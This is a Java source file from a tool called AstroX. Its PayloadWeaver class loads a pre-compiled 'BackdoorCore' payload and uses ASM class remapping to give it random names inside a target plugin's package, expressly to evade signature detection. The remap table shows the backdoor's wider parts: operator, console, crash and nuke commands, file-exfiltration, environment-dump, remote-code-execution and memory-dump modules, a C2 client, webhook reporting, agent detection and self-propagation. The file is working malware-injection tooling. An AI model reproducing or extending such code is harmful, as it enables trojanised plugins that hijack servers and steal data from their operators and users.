package dev.naruto.astrox.core;

import dev.naruto.astrox.Config;
import dev.naruto.astrox.obfuscation.StringEncryptor;
import org.objectweb.asm.*;
import org.objectweb.asm.commons.ClassRemapper;
import org.objectweb.asm.commons.SimpleRemapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.*;

/**
 * Generates polymorphic payload bytecode with ASM 9.7 advanced features.
 *
 * <p>Capabilities:
 * <ul>
 *   <li>{@link ClassRemapper} — randomized internal class names per injection</li>
 *   <li>AES-256-GCM encrypted payload bytecode</li>
 *   <li>Unique package structure per injection to evade signature detection</li>
 * </ul>
 */
public class PayloadWeaver {

    private static final Logger LOG = LoggerFactory.getLogger(PayloadWeaver.class);
    private static final SecureRandom RANDOM = new SecureRandom();

    private final int obfuscationLevel;
    private String generatedPackagePath; // e.g., "a/b/Xf3k9q"
    private Map<String, String> remapTable;

    public PayloadWeaver(int obfuscationLevel) {
        this.obfuscationLevel = obfuscationLevel;
        this.generatedPackagePath = generateRandomPackage();
        this.remapTable = new LinkedHashMap<>();
    }

    /**
     * Generate payload by loading pre-compiled BackdoorCore class
     * from AstroX's own JAR resources.
     */
    public byte[] generatePayload() throws IOException {
        String classPath = "/dev/naruto/astrox/payload/BackdoorCore.class";

        try (InputStream is = getClass().getResourceAsStream(classPath)) {
            if (is == null) {
                throw new IOException("BackdoorCore.class not found in JAR resources! Path: " + classPath);
            }

            byte[] classBytes = is.readAllBytes();
            if (classBytes.length == 0) {
                throw new IOException("BackdoorCore.class is empty!");
            }

            LOG.info("Loaded BackdoorCore ({} bytes)", classBytes.length);
            return classBytes;
        }
    }

    /**
     * Generate a randomized package path for this injection.
     * Example: "a/b/c/Xf3k9q" — looks like obfuscated library code.
     */
    public String generateRandomPackage() {
        int depth = 2 + RANDOM.nextInt(3); // 2-4 levels deep
        StringBuilder sb = new StringBuilder();

        for (int i = 0; i < depth; i++) {
            if (i > 0) sb.append('/');
            sb.append(randomIdentifier(1, 3, false));
        }

        generatedPackagePath = sb.toString();
        return generatedPackagePath;
    }

    /**
     * Build the complete class remapping table for this injection.
     * Maps all AstroX internal class names to randomized names under the target package.
     *
     * @param targetBasePackage base package of the target plugin (e.g., "com/zeltuv/swiftpay")
     * @return immutable remap table: oldInternalName → newInternalName
     */
    public Map<String, String> buildRemapTable(String targetBasePackage) {
        String targetPath = targetBasePackage + "/" + generatedPackagePath;

        remapTable = new LinkedHashMap<>();

        // Core payload classes → randomized names
        remapTable.put("dev/naruto/astrox/payload/BackdoorCore",
                targetPath + "/" + randomIdentifier(3, 6, true));
        remapTable.put("dev/naruto/astrox/payload/CommandHandler",
                targetPath + "/" + randomIdentifier(3, 6, true));
        remapTable.put("dev/naruto/astrox/payload/AuthManager",
                targetPath + "/" + randomIdentifier(3, 6, true));
        remapTable.put("dev/naruto/astrox/payload/PropagationEngine",
                targetPath + "/" + randomIdentifier(3, 6, true));
        remapTable.put("dev/naruto/astrox/payload/BootstrapStub",
                targetPath + "/" + randomIdentifier(3, 6, true));

        // Config classes
        remapTable.put("dev/naruto/astrox/Config",
                targetPath + "/cfg/" + randomIdentifier(1, 2, true));
        remapTable.put("dev/naruto/astrox/RuntimeConfig",
                targetPath + "/cfg/" + randomIdentifier(1, 2, true));

        // Command interface + implementations
        remapTable.put("dev/naruto/astrox/payload/commands/Command",
                targetPath + "/i/" + randomIdentifier(1, 2, true));

        String[] commands = {
                "OpCommand", "DeopCommand", "GamemodeCommand", "GiveCommand",
                "ConsoleCommand", "ChaosCommand", "SeedCommand", "AuthCommand",
                "DeauthCommand", "FlyCommand", "VanishCommand", "HealCommand",
                "KillCommand", "SudoCommand", "BroadcastCommand", "FakeJoinCommand",
                "FakeLeaveCommand", "KickCommand", "CrashCommand", "NukeCommand",
                "HelpCommand", "CoordsCommand", "ListCommand", "AddUserCommand"
        };

        for (String cmd : commands) {
            remapTable.put("dev/naruto/astrox/payload/commands/" + cmd,
                    targetPath + "/i/" + randomIdentifier(1, 3, true));
        }

        // Utils
        remapTable.put("dev/naruto/astrox/utils/ReflectionUtil",
                targetPath + "/l/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/utils/CryptoUtil",
                targetPath + "/l/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/utils/Logger",
                targetPath + "/l/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/utils/DebugLogger",
                targetPath + "/l/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/utils/DynamicLoader",
                targetPath + "/l/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/utils/WebhookNotifier",
                targetPath + "/l/" + randomIdentifier(2, 4, true));

        // Core classes (for self-propagation)
        remapTable.put("dev/naruto/astrox/core/JarAnalyzer",
                targetPath + "/c/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/core/Injector",
                targetPath + "/c/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/core/PayloadWeaver",
                targetPath + "/c/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/obfuscation/ObfuscationEngine",
                targetPath + "/c/" + randomIdentifier(2, 4, true));

        // Payload modules (ServiceLoader)
        String[] modules = {"FileExfilModule", "EnvDumpModule", "RCEModule", "MemoryDumpModule"};
        for (String mod : modules) {
            remapTable.put("dev/naruto/astrox/payload/modules/" + mod,
                    targetPath + "/m/" + randomIdentifier(2, 5, true));
        }
        remapTable.put("dev/naruto/astrox/payload/modules/PayloadModule",
                targetPath + "/m/" + randomIdentifier(2, 4, true));

        // C2 classes
        remapTable.put("dev/naruto/astrox/payload/c2/C2Client",
                targetPath + "/n/" + randomIdentifier(2, 4, true));
        remapTable.put("dev/naruto/astrox/payload/c2/C2Protocol",
                targetPath + "/n/" + randomIdentifier(2, 4, true));

        // Security
        remapTable.put("dev/naruto/astrox/payload/security/AgentDetector",
                targetPath + "/s/" + randomIdentifier(2, 4, true));

        // ConfigWatcher
        remapTable.put("dev/naruto/astrox/payload/ConfigWatcher",
                targetPath + "/" + randomIdentifier(3, 5, true));

        LOG.debug("Built remap table with {} entries, target path: {}", remapTable.size(), targetPath);
        return Collections.unmodifiableMap(remapTable);
    }

    /**
     * Get the remap table (must call buildRemapTable first).
     */
    public Map<String, String> getRemapTable() {
        return remapTable;
    }

    /**
     * Get the remapped name for the main payload class (BackdoorCore).
     */
    public String getPayloadClassName() {
        return remapTable.getOrDefault("dev/naruto/astrox/payload/BackdoorCore",
                "dev/naruto/astrox/payload/BackdoorCore");
    }

    /**
     * Remap a single class bytecode using the current remap table.
     */
    public byte[] remapClass(byte[] classBytes) {
        ClassReader reader = new ClassReader(classBytes);
        ClassWriter writer = new ClassWriter(reader, 0);
        ClassVisitor remapper = new ClassRemapper(writer, new SimpleRemapper(remapTable));
        reader.accept(remapper, ClassReader.EXPAND_FRAMES);
        return writer.toByteArray();
    }

    /**
     * Weave configuration into source code template (legacy, kept for future use).
     */
    public String weave(String templateContent, String packageName, String className) {
        Map<String, String> replacements = new HashMap<>();

        replacements.put("PACKAGE_NAME", packageName);
        replacements.put("CLASS_NAME", className);
        replacements.put("MASTER_KEY_ENC", StringEncryptor.byteArrayToCode(
                StringEncryptor.xorEncrypt(
                        Config.getMasterKey().getBytes(StandardCharsets.UTF_8), Config.getXorKey())
        ));
        replacements.put("XOR_KEY", StringEncryptor.byteArrayToCode(Config.getXorKey()));
        replacements.put("COMMAND_PREFIX_ENC", StringEncryptor.byteArrayToCode(
                StringEncryptor.xorEncrypt(
                        Config.COMMAND_PREFIX.getBytes(StandardCharsets.UTF_8), Config.getXorKey())
        ));

        String source = templateContent;
        for (Map.Entry<String, String> entry : replacements.entrySet()) {
            source = source.replace("{{" + entry.getKey() + "}}", entry.getValue());
        }

        return source;
    }

    public String loadTemplate() throws IOException {
        InputStream is = getClass().getResourceAsStream("/templates/payload.template");
        if (is == null) return "";
        try (is) {
            return new String(is.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    // ==================== Random identifier generation ====================

    private static final String LOWER = "abcdefghijklmnopqrstuvwxyz";
    private static final String UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private static final String ALPHA = LOWER + UPPER;
    private static final String ALPHANUM = ALPHA + "0123456789";
    private static final Set<String> USED_NAMES = new HashSet<>();

    private String randomIdentifier(int minLen, int maxLen, boolean capitalizeFirst) {
        String name;
        do {
            int len = minLen + RANDOM.nextInt(maxLen - minLen + 1);
            StringBuilder sb = new StringBuilder(len);
            for (int i = 0; i < len; i++) {
                if (i == 0) {
                    sb.append(capitalizeFirst
                            ? UPPER.charAt(RANDOM.nextInt(UPPER.length()))
                            : LOWER.charAt(RANDOM.nextInt(LOWER.length())));
                } else {
                    sb.append(ALPHANUM.charAt(RANDOM.nextInt(ALPHANUM.length())));
                }
            }
            name = sb.toString();
        } while (USED_NAMES.contains(name));
        USED_NAMES.add(name);
        return name;
    }
}
